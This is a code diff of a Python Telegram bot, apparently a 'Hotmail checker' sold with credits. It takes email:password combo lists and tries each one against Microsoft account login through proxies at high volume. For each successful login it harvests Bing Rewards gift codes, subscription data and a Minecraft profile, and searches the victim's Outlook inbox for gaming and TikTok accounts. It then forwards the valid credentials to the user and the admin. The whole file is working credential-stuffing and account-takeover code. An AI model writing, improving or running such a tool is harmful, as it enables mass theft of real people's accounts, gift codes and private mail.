@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Hotmail Checker Bot - Flux Optimized Version"""
+"""Hotmail Checker Bot - Final Ultra Optimized Version"""
 
 import re, json, uuid, sqlite3, logging, asyncio, time, os, random, threading
 from datetime import datetime
@@ -20,7 +20,10 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFO
 ADMIN_ID = 5944410248
 DB = "checker.db"
 
-# Global proxy list and executor
+# Flux logic constants
+SFTTAG_URL = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
+
+# Global state
 PROXIES = []
 db_lock = threading.Lock()
 executor = ThreadPoolExecutor(max_workers=500)
@@ -35,12 +38,12 @@ class Database:
                 c.execute('''CREATE TABLE IF NOT EXISTS results (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT, status TEXT, details TEXT, date TEXT)''')
                 c.execute('''CREATE TABLE IF NOT EXISTS settings (user_id INTEGER PRIMARY KEY, keywords TEXT, threads INTEGER DEFAULT 5)''')
 
-                # Check for is_mod column
+                # Table migrations
                 c.execute("PRAGMA table_info(users)")
-                if 'is_mod' not in [col[1] for col in c.fetchall()]:
-                    c.execute("ALTER TABLE users ADD COLUMN is_mod INTEGER DEFAULT 0")
+                cols = [col[1] for col in c.fetchall()]
+                if 'is_mod' not in cols: c.execute("ALTER TABLE users ADD COLUMN is_mod INTEGER DEFAULT 0")
+                if 'is_banned' not in cols: c.execute("ALTER TABLE users ADD COLUMN is_banned INTEGER DEFAULT 0")
 
-                # Check for details column
                 c.execute("PRAGMA table_info(results)")
                 if 'details' not in [col[1] for col in c.fetchall()]:
                     c.execute("ALTER TABLE results ADD COLUMN details TEXT")
@@ -60,6 +63,18 @@ class Database:
             finally:
                 conn.close()
     
+    def has_access(self, uid):
+        if uid == ADMIN_ID: return True
+        with db_lock:
+            conn = sqlite3.connect(DB, check_same_thread=False)
+            try:
+                c = conn.cursor()
+                c.execute('SELECT has_access FROM users WHERE user_id = ?', (uid,))
+                r = c.fetchone()
+                return r and r[0] == 1
+            finally:
+                conn.close()
+
     def is_mod(self, uid):
         if uid == ADMIN_ID: return True
         with db_lock:
@@ -79,18 +94,6 @@ class Database:
                 c = conn.cursor()
                 c.execute('UPDATE users SET is_mod = ? WHERE user_id = ?', (state, uid))
                 conn.commit()
-            finally:
-                conn.close()
-
-    def has_access(self, uid):
-        if uid == ADMIN_ID: return True
-        with db_lock:
-            conn = sqlite3.connect(DB, check_same_thread=False)
-            try:
-                c = conn.cursor()
-                c.execute('SELECT has_access FROM users WHERE user_id = ?', (uid,))
-                r = c.fetchone()
-                return r and r[0] == 1
             finally:
                 conn.close()
 
@@ -243,7 +246,6 @@ class Checker:
         if proxy:
             self.session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
 
-        self.sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
         self.headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
             'Accept-Language': 'en-US,en;q=0.9',
@@ -253,140 +255,137 @@ class Checker:
         }
 
     def get_login_params(self):
-        attempts = 0
-        while attempts < 3:
+        for _ in range(3):
             try:
-                r = self.session.get(self.sFTTag_url, headers=self.headers, timeout=5)
+                r = self.session.get(SFTTAG_URL, headers=self.headers, timeout=10)
                 text = r.text
                 ppft = re.search(r'name="PPFT".*?value="(.+?)"', text) or re.search(r'sFTTag:\'(.+?)\'', text) or re.search(r'value="(.+?)"', text)
                 url_post = re.search(r'"urlPost":"(.+?)"', text) or re.search(r'action="(.+?)"', text)
                 if ppft and url_post:
                     return url_post.group(1).replace('&amp;', '&'), ppft.group(1)
             except: pass
-            attempts += 1
-            time.sleep(0.05)
+            time.sleep(0.1)
         return None, None
+
+    def follow_forms(self, response):
+        """Automatically follow intermediate auto-submit forms (fmHF)"""
+        text = response.text
+        for _ in range(5): # Max 5 hops
+            if 'fmHF' in text or 'JavaScript required to sign in' in text:
+                try:
+                    soup = BeautifulSoup(text, 'html.parser')
+                    form = soup.find('form', id='fmHF') or soup.find('form', attrs={'name': 'fmHF'})
+                    if form:
+                        action = form.get('action', '')
+                        if action.startswith('/'): action = 'https://login.live.com' + action
+                        data = {i.get('name'): i.get('value', '') for i in form.find_all('input') if i.get('name')}
+                        resp = self.session.post(action, data=data, timeout=10)
+                        text = resp.text
+                        if '#' in resp.url: return resp
+                        continue
+                except: break
+            break
+        return response
 
     def login(self, email, password):
         urlPost, sFTTag = self.get_login_params()
         if not urlPost or not sFTTag: return None
 
-        attempts = 0
-        while attempts < 3:
+        for _ in range(3):
             try:
                 data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
-                r = self.session.post(urlPost, data=data, headers=self.headers, allow_redirects=True, timeout=8)
+                r = self.session.post(urlPost, data=data, headers=self.headers, allow_redirects=True, timeout=15)
+                r = self.follow_forms(r)
 
-                if '#' in r.url and r.url != self.sFTTag_url:
+                # Check terminals
+                if '#' in r.url and 'access_token' in r.url:
                     token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
                     if token: return token
 
-                elif 'cancel?mkt=' in r.text:
-                    ipt = re.search(r'name="ipt" value="(.+?)"', r.text)
-                    pprid = re.search(r'name="pprid" value="(.+?)"', r.text)
-                    uaid = re.search(r'name="uaid" value="(.+?)"', r.text)
-                    action = re.search(r'id="fmHF" action="(.+?)"', r.text)
-                    if ipt and pprid and uaid and action:
-                        d = {'ipt': ipt.group(1), 'pprid': pprid.group(1), 'uaid': uaid.group(1)}
-                        ret = self.session.post(action.group(1), data=d, timeout=8)
-                        r_url = re.search(r'"returnUrl":"(.+?)"', ret.text)
-                        if r_url:
-                            fin = self.session.get(r_url.group(1).replace('\\u0026', '&'), timeout=8)
-                            token = parse_qs(urlparse(fin.url).fragment).get('access_token', [None])[0]
-                            if token: return token
+                if any(v in r.text for v in ['recover?mkt', 'identity/confirm', 'Email/Confirm', '/Abuse?mkt', 'cancel?mkt=']):
                     return '2FA'
 
-                elif any(v in r.text for v in ['recover?mkt', 'identity/confirm', 'Email/Confirm', '/Abuse?mkt']):
-                    return '2FA'
-
-                elif any(v in r.text.lower() for v in ['password is incorrect', "account doesn't exist", 'sign in to your microsoft account']):
+                if any(v in r.text.lower() for v in ['password is incorrect', "account doesn't exist", 'sign in to your microsoft account', 'help us protect your account']):
                     return 'BAD'
             except: pass
-            attempts += 1
-            time.sleep(0.05)
+            time.sleep(0.1)
         return None
 
-    def capture_full(self, token, email, keywords=[]):
-        cap = {'pts': 0, 'codes': [], 'subs': [], 'mc': 'No', 'psn': 'No', 'steam': 'No', 'sc': 'No', 'tk': 'No', 'name': 'N/A', 'country': 'N/A', 'keys': []}
+    def check_rewards(self, token):
+        data = {'pts': 0, 'codes': []}
         try:
-            # Rewards
-            try:
-                r = self.session.get("https://rewards.bing.com/", timeout=5)
-                m = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
-                if m: cap['pts'] = int(m.group(1))
+            r = self.session.get("https://rewards.bing.com/", timeout=10)
+            m = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
+            if m: data['pts'] = int(m.group(1))
 
-                if cap['pts'] > 0:
-                    url = 'https://rewards.bing.com/redeem/orderhistory'
-                    r = self.session.get(url, timeout=5)
-                    if 'fmHF' in r.text:
-                        soup = BeautifulSoup(r.text, 'html.parser')
-                        form = soup.find('form', id='fmHF')
-                        if form:
-                            d = {i.get('name'): i.get('value', '') for i in form.find_all('input') if i.get('name')}
-                            a = form.get('action', '')
-                            if a.startswith('/'): a = 'https://login.live.com' + a
-                            self.session.post(a, data=d, timeout=5)
-                            r = self.session.get(url, timeout=5)
+            if data['pts'] > 0:
+                url = 'https://rewards.bing.com/redeem/orderhistory'
+                r = self.session.get(url, timeout=10)
+                r = self.follow_forms(r)
 
-                    text = BeautifulSoup(r.text, 'html.parser').get_text()
-                    patterns = [r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b']
-                    for p in patterns:
-                        found = re.findall(p, text)
-                        for c in found:
-                            if not any(x in c for x in ['POINTS', 'ORDER', 'MICROSOFT']):
-                                cap['codes'].append(c)
-            except: pass
+                soup = BeautifulSoup(r.text, 'html.parser')
+                text = soup.get_text()
+                patterns = [r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b']
+                for p in patterns:
+                    for c in re.findall(p, text):
+                        if not any(x in c for x in ['POINTS', 'ORDER', 'MICROSOFT']):
+                            data['codes'].append(c)
+        except: pass
+        return data
 
-            # Profile
+    def capture_full(self, token, email, keywords=[]):
+        cap = {'mc': 'No', 'psn': 'No', 'steam': 'No', 'sc': 'No', 'tk': 'No', 'subs': [], 'name': 'N/A', 'country': 'N/A', 'keys': []}
+        try:
             cid = self.session.cookies.get("MSPCID", "").upper()
             h = {'Authorization': f'Bearer {token}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0'}
+
+            # Profile & Country
             try:
-                r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=h, timeout=5)
+                r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=h, timeout=10)
                 if r.status_code == 200:
                     p = r.json()
                     cap['name'] = p.get('displayName', 'N/A')
                     loc = p.get('location', {})
-                    if isinstance(loc, dict):
-                        cap['country'] = loc.get('country', loc.get('countryOrRegion', 'N/A'))
+                    if isinstance(loc, dict): cap['country'] = loc.get('country', loc.get('countryOrRegion', 'N/A'))
                     else: cap['country'] = str(loc)
             except: pass
 
-            # Subscriptions
+            # Minecraft
             try:
-                state = json.dumps({"userId": str(uuid.uuid4()).replace('-', '')[:16], "scopeSet": "pidl"})
-                url = f"https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state={quote(state)}&prompt=none"
-                r = self.session.get(url, headers={"Referer": "https://account.microsoft.com/"}, timeout=8)
-                p_token = re.search(r'access_token=([^&\s"\']+)', r.text + " " + r.url)
-                if p_token:
-                    ph = {"Authorization": f'MSADELEGATE1.0="{unquote(p_token.group(1))}"', "Accept": "application/json", "Referer": "https://account.microsoft.com/"}
-                    r_sub = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=ph, timeout=5)
-                    if r_sub.status_code == 200:
-                        kws = {'Xbox Game Pass': 'Game Pass', 'Microsoft 365': 'M365', 'Office 365': 'Office 365', 'OneDrive': 'OneDrive', 'EA Play': 'EA Play'}
-                        for kw, n in kws.items():
-                            if kw in r_sub.text: cap['subs'].append(n)
+                r = self.session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, timeout=10)
+                if r.status_code == 200: cap['mc'] = f"Yes ({r.json().get('name')})"
             except: pass
 
-            # Inbox Search
-            queries = {'psn': "sony@txn-email.playstation.com", 'steam': "noreply@steampowered.com", 'sc': "noreply@id.supercell.com", 'tk': "account.tiktok"}
+            # Inbox Search (PSN, Steam, SC, TikTok)
+            queries = {'psn': "sony@txn-email.playstation.com OR PlayStation Order", 'steam': "noreply@steampowered.com purchase", 'sc': "noreply@id.supercell.com", 'tk': "account.tiktok"}
             for key, q in queries.items():
                 payload = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": q}, "Size": 1}]}
-                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers={**h, 'Content-Type': 'application/json'}, timeout=5)
+                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers={**h, 'Content-Type': 'application/json'}, timeout=10)
                 if r.status_code == 200:
                     try:
                         if r.json()['EntitySets'][0]['ResultSets'][0].get('Total', 0) > 0: cap[key] = "Yes"
                     except: pass
 
-            # Minecraft
+            # Subscriptions
             try:
-                r = self.session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, timeout=5)
-                if r.status_code == 200: cap['mc'] = f"Yes ({r.json().get('name')})"
+                state = json.dumps({"userId": str(uuid.uuid4()).replace('-', '')[:16], "scopeSet": "pidl"})
+                u = f"https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state={quote(state)}&prompt=none"
+                r = self.session.get(u, headers={"Referer": "https://account.microsoft.com/"}, timeout=15)
+                pt = re.search(r'access_token=([^&\s"\']+)', r.text + " " + r.url)
+                if pt:
+                    ph = {"Authorization": 'MSADELEGATE1.0="' + unquote(pt.group(1)) + '"', "Accept": "application/json", "Referer": "https://account.microsoft.com/"}
+                    r_s = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=ph, timeout=10)
+                    if r_s.status_code == 200:
+                        kws = {'Xbox Game Pass': 'Game Pass', 'Microsoft 365': 'M365', 'Office 365': 'Office 365', 'OneDrive': 'OneDrive'}
+                        for kw, n in kws.items():
+                            if kw in r_s.text: cap['subs'].append(n)
             except: pass
 
             # Custom Keywords
             if keywords:
                 for kw in keywords:
-                    payload = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": kw}, "Size": 1}]}
-                    r = self.session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers={**h, 'Content-Type': 'application/json'}, timeout=5)
+                    p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": kw}, "Size": 1}]}
+                    r = self.session.post("https://outlook.live.com/search/api/v2/query", json=p, headers={**h, 'Content-Type': 'application/json'}, timeout=10)
                     if r.status_code == 200:
                         try:
                             t = r.json()['EntitySets'][0]['ResultSets'][0].get('Total', 0)
@@ -396,14 +395,17 @@ class Checker:
         return cap
 
     def check(self, email, password, keywords=[]):
-        res = {'email': email, 'status': 'bad', 'cap': {}}
+        res = {'email': email, 'status': 'bad', 'details': {}}
         token = self.login(email, password)
         if not token: return res
         if token == '2FA':
             res['status'] = '2fa'
             return res
+
         res['status'] = 'hit'
-        res['cap'] = self.capture_full(token, email, keywords)
+        rew = self.check_rewards(token)
+        cap = self.capture_full(token, email, keywords)
+        res['details'] = {**rew, **cap}
         return res
 
 db = Database()
@@ -412,12 +414,12 @@ async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
     uid = u.effective_user.id
     db.add_user(uid, u.effective_user.username, u.effective_user.first_name)
     if db.is_banned(uid): return
-    welcome = f"🚀 **Ultra High CPM Hotmail Checker**\n\nTarget: 200+ CPM enabled.\nProxies: `{len(PROXIES)}` loaded."
+    t = f"🚀 **High Performance Hotmail Checker**\n\nTarget CPM: 200+\nProxies: `{len(PROXIES)}` loaded."
     kb = [[InlineKeyboardButton("🔍 Start Check", callback_data="check"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
           [InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("🌐 Proxies", callback_data="proxies")]]
-    if uid == ADMIN_ID: kb.append([InlineKeyboardButton("🛠 Admin", callback_data="admin")])
-    if u.callback_query: await u.callback_query.edit_message_text(welcome, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))
-    else: await u.message.reply_text(welcome, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))
+    if uid == ADMIN_ID: kb.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin")])
+    if u.callback_query: await u.callback_query.edit_message_text(t, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))
+    else: await u.message.reply_text(t, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))
 
 async def handle_proxies(u: Update, c: ContextTypes.DEFAULT_TYPE):
     if not db.has_access(u.effective_user.id): return
@@ -431,12 +433,13 @@ async def handle_proxies(u: Update, c: ContextTypes.DEFAULT_TYPE):
 async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
     uid = u.effective_user.id
     if db.is_banned(uid) or not db.has_access(uid): return
+
     text = (await (await c.bot.get_file(u.message.document.file_id)).download_as_bytearray()).decode('utf-8') if u.message.document else u.message.text
     lines = [l.strip() for l in text.split('\n') if ':' in l]
     if not lines: return
 
     settings = db.get_user_settings(uid)
-    max_threads = min(settings['threads'] if PROXIES else 5, 300)
+    max_threads = min(settings['threads'] if PROXIES else 5, 250)
 
     status_msg = await u.message.reply_text("🔄 **Starting ultra-high CPM engine...**", parse_mode='Markdown')
     hits, bad, tfa, checked = 0, 0, 0, 0
@@ -448,8 +451,10 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
     def run_check(line):
         try:
             e, p = line.split(':', 1)
-            checker = Checker(random.choice(PROXIES) if PROXIES else None)
-            res = checker.check(e.strip(), p.strip(), settings['keywords'])
+            e, p = e.strip(), p.strip()
+            proxy = random.choice(PROXIES) if PROXIES else None
+            checker = Checker(proxy)
+            res = checker.check(e, p, settings['keywords'])
             return {'e': e, 'p': p, 'res': res}
         except: return None
 
@@ -464,93 +469,80 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
             email, pwd, res = data['e'], data['p'], data['res']
             checked += 1
             db.save_result(uid, email, res['status'], res)
+
             if res['status'] == 'hit':
                 hits += 1
-                c_data = res['cap']
-                cap_str = f"Name:{c_data['name']} | Country:{c_data['country']} | Pts:{c_data['pts']} | "
-                cap_str += ", ".join([f"{k}:{v}" for k,v in c_data.items() if v != 'No' and k not in ['subs', 'name', 'country', 'pts', 'codes', 'keys']])
-                if c_data['subs']: cap_str += f" | Subs:{', '.join(c_data['subs'])}"
-                if c_data['keys']: cap_str += f" | Keys:{', '.join(c_data['keys'])}"
-                hit_text = f"🎯 **HIT**\n📧 `{email}`\n🔑 `{pwd}`\n💰 Pts: `{c_data['pts']}` | 🎁 Codes: `{len(c_data['codes'])}`"
+                det = res['details']
+                cap_str = f"Name:{det['name']} | Country:{det['country']} | Pts:{det['pts']} | "
+                cap_str += ", ".join([f"{k}:{v}" for k,v in det.items() if v != 'No' and k not in ['subs', 'name', 'country', 'pts', 'codes', 'keys']])
+                if det['subs']: cap_str += f" | Subs:{', '.join(det['subs'])}"
+                if det['keys']: cap_str += f" | Keys:{', '.join(det['keys'])}"
+
+                hit_text = f"🎯 **HIT**\n📧 `{email}`\n🔑 `{pwd}`\n💰 Pts: `{det['pts']}` | 🎁 Codes: `{len(det['codes'])}`"
                 if cap_str: hit_text += f"\n🎮 Cap: `{cap_str}`"
+
                 last_hits.append(f"✅ {email}")
                 if len(last_hits) > 5: last_hits.pop(0)
                 try: await c.bot.send_message(uid, hit_text, parse_mode='Markdown')
                 except: pass
-                # Log to admin if it's a significant hit
-                if uid != ADMIN_ID and (c_data['pts'] > 0 or 'Yes' in str(c_data)):
+                # Log to admin
+                if uid != ADMIN_ID and (det['pts'] > 0 or 'Yes' in str(det)):
                     try: await c.bot.send_message(ADMIN_ID, f"📢 **User {uid} Hit:**\n{hit_text}", parse_mode='Markdown')
                     except: pass
-                with open(results_file, 'a') as f: f.write(f"{email}:{pwd} | Pts:{c_data['pts']} | Cap:{cap_str} | Codes:{c_data['codes']}\n")
+                with open(results_file, 'a') as f: f.write(f"{email}:{pwd} | Pts:{det['pts']} | Cap:{cap_str} | Codes:{det['codes']}\n")
             elif res['status'] == '2fa': tfa += 1
             else: bad += 1
+
             async with update_lock:
                 now = time.time()
                 if now - last_update > 2 or checked == len(lines):
                     last_update = now
                     elapsed = now - start_time
                     cpm = int((checked / elapsed) * 60) if elapsed > 0 else 0
-                    prg = (f"🔄 **Live Capture Screen**\n\n📊 Progress: `{checked}/{len(lines)}`\n🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n🔒 2FA: `{tfa}` | ⚡️ CPM: `{cpm}`\n\n🕒 Last Hits:\n`{chr(10).join(last_hits) or 'None yet'}`")
+                    capture_screen = "\n".join(last_hits)
+                    prg = (f"🔄 **Live Capture Screen**\n\n"
+                           f"📊 Progress: `{checked}/{len(lines)}`\n"
+                           f"🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n"
+                           f"🔒 2FA: `{tfa}` | ⚡️ CPM: `{cpm}`\n\n"
+                           f"🕒 Last Hits:\n`{capture_screen or 'None yet'}`")
                     try: await status_msg.edit_text(prg, parse_mode='Markdown')
                     except: pass
 
     await asyncio.gather(*(sem_worker(l) for l in lines))
     if os.path.exists(results_file):
-        with open(results_file, 'rb') as f: await u.message.reply_document(f, caption=f"✅ **Check Complete!** Hits: `{hits}`", parse_mode='Markdown')
+        with open(results_file, 'rb') as f: await u.message.reply_document(f, caption=f"✅ **Check Finished!** Hits: `{hits}`", parse_mode='Markdown')
         os.remove(results_file)
-    else: await u.message.reply_text("✅ **Check Complete!** No hits.", parse_mode='Markdown')
+    else: await u.message.reply_text("✅ **Check Finished!** No hits.", parse_mode='Markdown')
 
 async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
     uid = u.effective_user.id
     if not db.is_mod(uid): return
     txt = u.message.text
     if not txt.startswith('!!'): return
-
     try:
         parts = txt.split()
         cmd = parts[0][2:].lower()
-
         if cmd == "help":
-            help_text = (
-                "🛠 **Admin Commands**\n\n"
-                "!!addcredits [uid] [amt]\n"
-                "!!removecredits [uid] [amt]\n"
-                "!!ban [uid]\n"
-                "!!unban [uid]\n"
-                "!!grant [uid] [amt]\n"
-                "!!revoke [uid]\n"
-            )
-            if uid == ADMIN_ID:
-                help_text += "!!mod [uid]\n!!unmod [uid]\n"
-            await u.message.reply_text(help_text, parse_mode='Markdown')
-
+            h = "🛠 **Admin Commands**\n\n!!addcredits [uid] [amt]\n!!removecredits [uid] [amt]\n!!ban [uid]\n!!unban [uid]\n!!grant [uid] [amt]\n!!revoke [uid]\n"
+            if uid == ADMIN_ID: h += "!!mod [uid]\n!!unmod [uid]\n"
+            await u.message.reply_text(h, parse_mode='Markdown')
         elif cmd == "addcredits" and len(parts) == 3:
-            db.add_credits(int(parts[1]), int(parts[2]))
-            await u.message.reply_text(f"✅ Added {parts[2]} credits to {parts[1]}")
+            db.add_credits(int(parts[1]), int(parts[2])); await u.message.reply_text(f"✅ Added {parts[2]} credits to {parts[1]}")
         elif cmd == "removecredits" and len(parts) == 3:
-            db.add_credits(int(parts[1]), -int(parts[2]))
-            await u.message.reply_text(f"✅ Removed {parts[2]} credits from {parts[1]}")
+            db.add_credits(int(parts[1]), -int(parts[2])); await u.message.reply_text(f"✅ Removed {parts[2]} credits from {parts[1]}")
         elif cmd == "ban" and len(parts) == 2:
-            db.set_ban(int(parts[1]), 1)
-            await u.message.reply_text(f"✅ Banned {parts[1]}")
+            db.set_ban(int(parts[1]), 1); await u.message.reply_text(f"✅ Banned {parts[1]}")
         elif cmd == "unban" and len(parts) == 2:
-            db.set_ban(int(parts[1]), 0)
-            await u.message.reply_text(f"✅ Unbanned {parts[1]}")
+            db.set_ban(int(parts[1]), 0); await u.message.reply_text(f"✅ Unbanned {parts[1]}")
         elif cmd == "grant" and len(parts) == 3:
-            db.grant(int(parts[1]), int(parts[2]))
-            await u.message.reply_text(f"✅ Granted access to {parts[1]} with {parts[2]} credits")
+            db.grant(int(parts[1]), int(parts[2])); await u.message.reply_text(f"✅ Granted {parts[1]} with {parts[2]} credits")
         elif cmd == "revoke" and len(parts) == 2:
-            db.revoke(int(parts[1]))
-            await u.message.reply_text(f"✅ Revoked access from {parts[1]}")
+            db.revoke(int(parts[1])); await u.message.reply_text(f"✅ Revoked {parts[1]}")
         elif cmd == "mod" and uid == ADMIN_ID and len(parts) == 2:
-            db.set_mod(int(parts[1]), 1)
-            await u.message.reply_text(f"✅ Modded {parts[1]}")
+            db.set_mod(int(parts[1]), 1); await u.message.reply_text(f"✅ Modded {parts[1]}")
         elif cmd == "unmod" and uid == ADMIN_ID and len(parts) == 2:
-            db.set_mod(int(parts[1]), 0)
-            await u.message.reply_text(f"✅ Unmodded {parts[1]}")
-
-    except Exception as e:
-        await u.message.reply_text(f"❌ Error: {e}")
+            db.set_mod(int(parts[1]), 0); await u.message.reply_text(f"✅ Unmodded {parts[1]}")
+    except Exception as e: await u.message.reply_text(f"❌ Error: {e}")
 
 async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
     q = u.callback_query; uid = q.from_user.id; await q.answer()
@@ -560,8 +552,8 @@ async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
     elif q.data == "check": await q.edit_message_text("📝 **Combo Input**\n\nSend `email:password` list or upload a `.txt` file.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
     elif q.data == "stats":
         s = db.user_stats(uid)
-        label = "Admin" if uid == ADMIN_ID else (q.from_user.username or q.from_user.first_name)
-        await q.edit_message_text(f"📊 **Statistics for {label}**\n\n💰 Credits: `{'Unlimited' if uid == ADMIN_ID else s['credits']}`\n🔍 Checks: `{s['checks']}`\n🎯 Hits: `{s['hits']}`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
+        label = "Admin" if uid == ADMIN_ID else (u.effective_user.username or u.effective_user.first_name)
+        await q.edit_message_text(f"📊 **Stats for {label}**\n\n💰 Credits: `{'Unlimited' if uid == ADMIN_ID else s['credits']}`\n🔍 Checks: `{s['checks']}`\n🎯 Hits: `{s['hits']}`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
     elif q.data == "proxies": await q.edit_message_text(f"🌐 **Proxy Loader**\n\nLoaded: `{len(PROXIES)}` proxies.\nUpdate by uploading .txt with 'proxy' in caption.", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
     elif q.data == "admin":
         if db.is_mod(uid):
